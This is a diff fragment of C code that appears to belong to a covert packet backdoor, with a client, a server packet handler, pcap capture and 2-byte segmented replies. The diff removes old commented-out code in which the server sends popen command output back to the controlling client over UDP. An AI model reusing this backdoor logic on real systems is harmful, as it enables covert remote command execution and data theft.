@@ -159,7 +159,7 @@ void client(struct client_opt c_opt){
         system_fatal("setsockopt");
     
     // Send packet
-     if(c_opt.protocol == 1)
+    if(c_opt.protocol == 1)
         send_udp_datagram(&user_addr, bd_message, bd_message_len, 0);
     else
         send_tcp_datagram(&user_addr, bd_message, bd_message_len, 0);
@@ -227,38 +227,6 @@ void client(struct client_opt c_opt){
     printf("Capturing...\n");
     pcap_loop(client_handle, -1, client_packet_handler, (u_char *)&msg_buf);
     
-    /* OLD UDP METHOD
-    // Initialize variables    
-    int sockfd, n;
-    struct sockaddr_in server, client;
-    memset(&server, 0, sizeof(struct sockaddr_in));
-    memset(&client, 0, sizeof(struct sockaddr_in));
-    
-    // Create UDP socket
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    arg = 1;
-    if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
-        system_fatal("setsockopt");
-    
-    // Setup server info and bind
-    server.sin_family = AF_INET;
-    server.sin_addr.s_addr = htonl(INADDR_ANY);
-    server.sin_port = htons(DEFAULT_SRC_PORT);
-    bind(sockfd, (struct sockaddr *)&server, sizeof(server));
-    
-    // Receive UDP packet and print results
-    char reply[BD_MAX_REPLY_LEN];
-    memset(reply, 0, BD_MAX_REPLY_LEN);
-    socklen_t client_len = sizeof(client);
-    n = recvfrom(sockfd, reply, sizeof(reply), 0, (struct sockaddr *)&client, &client_len);
-    reply[n] = 0;
-    printf("Reply: \n");
-    printf("%s\n", reply);
-    
-    // Cleanup 
-    
-    free(bd_message);
-    close(sockfd);*/
 }
 
 /*
@@ -720,6 +688,7 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
     printf("sport: %d\n", server_addr.sport);
     printf("dport: %d\n", server_addr.dport);
     
+    usleep(500000);
     char test[] = "nexus";
     
     // 2 bytes at a time
@@ -755,27 +724,6 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
     else
         send_tcp_datagram(&server_addr, segment, sizeof(segment), 1);
     
-    
-    /* Send results back to client */
-    
-    /*// Open UDP socket
-    int sockfd;
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    int arg = 1;
-    if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
-        system_fatal("setsockopt");
-    
-    // Send results from popen command
-    char output[BD_MAX_REPLY_LEN];
-    memset(output, 0, BD_MAX_REPLY_LEN);
-    fread((void *)output, sizeof(char), BD_MAX_REPLY_LEN, fp);
-    sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)dst_host, sizeof(struct sockaddr_in));
-    printf("Sent results back to client.\n");
-    
-    // Cleanup
-    free(bd_command);
-    close(sockfd);
-    pclose(fp);*/
 }
 
 /*
